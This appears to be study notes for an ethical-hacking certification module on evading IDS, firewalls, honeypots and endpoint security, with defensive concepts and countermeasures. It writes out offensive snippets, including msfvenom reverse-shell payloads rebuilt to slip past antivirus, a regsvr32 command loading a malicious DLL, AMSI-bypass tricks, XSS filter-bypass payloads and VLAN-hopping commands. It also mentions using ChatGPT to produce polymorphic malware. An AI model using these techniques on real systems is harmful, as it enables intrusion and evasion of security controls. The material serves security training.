# Module 12 – Evading IDS, Firewalls, and Honeypots

> Status: ✅ Reference complete

## 1. IDS, IPS & firewall concepts
- **IDS** — monitors traffic, detects + alerts. *Passive IDS* alerts only; *Active IDS (IPS)* detects + blocks inline. Placed near the firewall (outside, inside/DMZ, or both for layered defense).
- **IPS** — inline, blocks/drops malicious traffic in real time; host-based or network-based.
- **IDS detection methods:** *signature recognition* (misuse detection — match known patterns; false positives, needs updates), *anomaly detection* (deviation from a normal-behavior model), *protocol anomaly detection* (traffic breaking protocol rules).
- **Intrusion indicators:** file-system (unknown files, privilege escalation, attribute changes, rogue SUID/SGID, odd names, missing files, disk/bandwidth drain), network (bandwidth spikes, service probing, unknown IPs, failed logins, heavy logs, config changes), system (short logs, slow performance, modified system files, unknown processes, unauthorized software).
- **IDS types:** NIDS (network-wide, promiscuous mode, routers) vs HIDS (per-host, file changes/insider threats).
- **Alert types:** True Positive (attack→alert), False Positive (no attack→alert), False Negative (attack→no alert, dangerous), True Negative (no attack→no alert).

### Firewall
Hardware/software gateway filtering traffic by IP/port/protocol against rules.
- **Architecture:** bastion host (2 interfaces, public + private), screened subnet/DMZ (three-homed firewall), multi-homed firewall (multiple NICs), DMZ (buffer for public-facing services).
- **By config:** network-based (edge, packet filtering, Cisco ASA/FortiGate) vs host-based (on a device, Norton/McAfee).
- **By mechanism** (and OSI layer): packet filtering (network/transport — IP/port/flags/protocol), circuit-level gateway (session — validates handshake), application-level/proxy (application — inspects content, active=detect+block, passive=detect+report), stateful multilayer inspection (tracks session state, Cisco PIX), application proxy (per-service gateway + caching), NAT (static/dynamic/PAT), VPN (encrypt+encapsulate), **NGFW** (deep inspection + IPS + app awareness + threat intel).
- **Limitations:** can't stop insiders, social engineering, zero-days, infected external devices, encrypted/tunneled traffic; single point; bottleneck; no AV replacement.

## 2. IDS/IPS/firewall solutions
### YARA
Malware-detection rules: **meta** (info) + **strings** (text/hex/regex) + **condition** (Boolean).
```text
rule silent_banker : banker {
    meta: description = "example"
    strings:
        $a = { 6A 40 68 00 30 00 00 6A 14 8D 91 }
        $c = "UVODFRYSIHLNWPEJXQZAKCBGMT"
    condition: $a or $b or $c
}
```
Tools: yarGen (`pip install -r requirements.txt`; `python yarGen.py --help`), yara-forge, YaraRET.

### Snort (IDS/IPS)
Uses libpcap/Winpcap. Modes: packet sniffer, packet logger, NIPS. Rule = **header** (action, protocol, src/dst IP+port, CIDR, direction) + **options** (content, msg). Actions: alert, log, pass, drop, reject, sdrop. Protocols: TCP, UDP, ICMP. Direction: `->` (one-way), `<>` (bidirectional). Ports: `:` ranges, `!` negation, `any`.
```text
log tcp !192.168.1.0/24 any <> 192.168.1.0/24 23
alert tcp !192.168.1.0/24 any -> 192.168.1.0/24 111 (content:"|00 01 86 a5|"; msg:"external mountd access";)
log tcp any -> 192.168.1.0/24 !6000:6010
log udp any -> 192.168.1.0/24 1:1024
```
Also: **Suricata** (IDS/IPS + YAML/JSON, SIEM integration), Zeek, OSSEC, Samhain, Cisco Secure IPS. IPS: Trellix, Check Point Quantum IPS, Palo Alto. Firewalls: Cisco ASA, FortiGate, pfSense, IPFire, Sophos.

## 3. IDS/firewall evasion
**Identification:** *port scanning* (find defenses by their ports), *firewalking* (TTL probes past the firewall → ICMP TTL-exceeded reveals allowed ports; Firewalk/Nmap), *banner grabbing* (`telnet mail.targetcompany.org 25`).

**Techniques:**
- **IP spoofing** — forge trusted source IP (Hping).
- **Source routing** — sender dictates path (loose/strict) to avoid monitored routes.
- **Tiny fragments** — split the TCP header across tiny fragments so IDS can't reassemble.
- **IP instead of URL** / **anonymous surfing sites** / **proxy server** (LAN settings → proxy IP:8080) to bypass blocked sites.
- **ICMP tunneling** — hide payload in ICMP Echo data (ICMPTX).
- **ACK tunneling** — hide payload in ACK packets (firewalls trust ACKs; Hping/Nping).
- **HTTP tunneling** — tunnel inside port-80 HTTP (Chisel, HTTPort+HTTHost, Tunna) for blocked apps (FTP/chat).
- **SSH tunneling** — wrap blocked traffic in SSH:
  ```bash
  ssh -f user@certifiedhacker.com -L 5000:certifiedhacker.com:25 -N   # local fwd to SMTP
  ```
  Bitvise: local / remote / dynamic (SOCKS proxy) port forwarding.
- **DNS tunneling** — encode data in DNS queries over port 53 (iodine, dnscat2).
- **External systems** (employee home machine), **MITM** (DNS poisoning + tunnel), **content** (malicious macros/files — EXE/DOC/XLS/PDF…).
- **XSS/WAF bypass:** ASCII values (`String.fromCharCode(...)`), hex encoding (`%3C%73...`), case obfuscation (`<sCRiPt>aLeRT("XSS")</sCriPT>`), HTTP header spoofing (`X-Forwarded-For: 127.0.0.1`), blacklist bypass (GROUP BY/HAVING instead of UNION/LIMIT), fuzzing (SecLists), abusing SSL/TLS ciphers (sslscan2).
- **HTML smuggling** — build+download malware in-browser via Blob API (no network fetch → evades IDS).
- **Windows BITS** — abuse Background Intelligent Transfer Service (bitsadmin jobs, `/SetNotifyCmdLine` for persistence) as trusted traffic.

**Other IDS evasion:** insertion attack (IDS accepts packets the host rejects), evasion (host accepts what IDS drops), DoS against IDS, obfuscating (Unicode/polymorphic/stego), false-positive generation, session splicing (tiny packets + delays; Nessus), Unicode evasion (`%u2215` for `/`), fragmentation (timeout mismatch between IDS & victim), TTL attacks (fake fragment with TTL=1 reaches only IDS), urgency flag, invalid RST packets (bad checksum), polymorphic shellcode (encrypted + decoder), ASCII shellcode, desynchronization (pre/post-connection SYN), **DGA** (character/PRNG/dictionary/high-collision), encryption (SSH/SSL/VPN tunnels), flooding.

## 4. NAC & endpoint security evasion
- **Bypass NAC via VLAN hopping** — DTP trunk (dynamic auto/desirable). VLANPWN: `DoubleTagging.py --nativevlan 1 --targetvlan 20`, `DTPHijacking.py`.
- **Bypass NAC via pre-authenticated device** — insert a Raspberry Pi between trusted device and switch (nac_bypass_setup.sh, FENRIR, Silentbridge).
- **Ghostwriting** — deconstruct binary, insert junk assembly, reassemble to defeat signature AV (Ghostwriting.sh + Metasploit).
- **Application whitelisting bypass** — DLL hijacking via trusted LOLBins: `regsvr32.exe /s /n /u /i:"C:\path_to_malicious.dll"`.
- **Dechaining macros** (VBScript in Office): ShellCOM (`ShellBrowserWindow` COM → ShellExecute), XMLDOM (`.xsl` payload), WmiPrvse.exe (`Win32_Process.Create`), scheduled tasks (fake author), registry modification (`StdRegProv.SetStringValue` Run key), dropping files (FileSystemObject → Startup), downloading content (XMLHTTP + ADODB.Stream), embed-and-drop (`msfvenom ... -f vba-exe`).
- **Clearing memory hooks** (x64dbg overwrites EDR hooks), **process injection** (`VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`), **LoLBins** (ConfigSecurityPolicy.exe, CustomShellHost.exe + Deimos C2), **CPL side-loading** (malware in `.cpl` files; CPLResourceRunner), **ChatGPT** (polymorphic malware, Base64, C2-driven mutation).
- **AV bypass via Metasploit templates:**
  ```bash
  msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=444 -f exe > Windows.exe
  # edit template.c (SCSIZE 4096→4000), then:
  i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
  msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=444 -x evasion.exe -f exe > bypass.exe
  ```
- **AMSI bypass:** PowerShell downgrade (`powershell -version 2`), obfuscation (`"Inv"+"o"+"ke"+"-Mimi"+"katz"`), forcing an error (nullify `amsiSession`/`amsiContext` via `AmsiUtils`), memory hijacking (hook `AmsiScanBuffer` → `AMSI_RESULT_CLEAN`).
- **Other:** phishing on trusted infra (AWS/GCP), encoded commands (`powershell.exe -EncodedCommand`), Fast Flux DNS, timing-based/sandbox evasion, signed binary proxy execution, shellcode encryption (XOR/RC4/AES), reducing entropy, ETW disabling (patch `EtwEventWrite`), direct syscalls (`NtAllocateVirtualMemory`), thread call-stack spoofing, in-memory beacon encryption.

## 5. Honeypots
Decoy systems; any interaction is likely malicious. **By interaction:** low (KFSensor, Honeytrap — basic service simulation), medium (Cowrie, Kippo — simulated OS/services), high (honeynet — real OS + honeywall controlling outbound), pure. **By deployment:** production (in the real network, detect threats) vs research (study attackers). **By deception:** malware, database, spam, email, spider, honeynet. Tools: HoneyBOT, Blumira, Cowrie, StingBox.

**Detecting honeypots:** service fingerprinting (`nmap -sV -p 80 <ip>`), response-time analysis (`nmap -p 80 --scan-delay 1s --max-retries 5 <ip>`), MAC/OUI analysis (`arp-scan --localnet`), unexpected open ports (`nmap -p- <ip>`), system config/metadata (banners/headers). **Tar pits:** L7 (slow SMTP responses), L4 (TCP window size 0, LaBrea), L2 (MAC `00:00:0F:FF:FF:FF`). Detect: Honeyd (time-based TCP fingerprinting), UML (`/proc/mounts`), Snort_inline (altered packets), VMware (MAC OUI), Fake AP, Bait-and-Switch (RTT/TTL/timestamps). Tools: Send-Safe Honeypot Hunter, SniffingBear.

## 6. Evasion countermeasures
- **IDS:** shut down malicious ports, traffic normalizer, reassemble fragments, drop spoofed IPs, update signatures, TCP FIN/RST to end attacks, honeypots, detect tunneling/obfuscation, behavioral analysis.
- **Firewall:** block intruder IPs, deny-all-by-default, separate user ID, remote syslog, log monitoring, review allowed traffic, per-IP connection limits, DPI, HTTPS/TLS inspection, zero trust.
- **Endpoint:** AI/behavior AV, patching, least privilege, MFA, segmentation, application whitelisting, SIEM, real-time monitoring, FIM, restrict USB.
- **NAC:** strong policies, device profiling, MFA, RBAC, segmentation, MAC filtering, audits, zero trust, SIEM, endpoint protection.
- **AV:** behavior/AI AV, keep updated, real-time protection, EPP/EDR, updates, whitelisting, segmentation, sandboxing, user training, least privilege.

### Evasion tools
Traffic IQ Professional, Nmap, Metasploit, PingRAT, Green Tunnel, Hyperion. Packet fragment generators: Colasoft Packet Builder, NetScanTools Pro, CommView, Ostinato, WireEdit.

> Flow: identify the defense (port scan/firewalking/banner grab) → pick an evasion (fragment/spoof for IDS, tunnel over ICMP/HTTP/SSH/DNS for firewall, encode/obfuscate for WAF, LOLBins/AMSI-bypass/injection for endpoint) → check for honeypots before committing. Defenders counter with traffic normalization, DPI, TLS inspection, behavioral/AI detection, zero trust, and layered IDS+firewall+EDR.
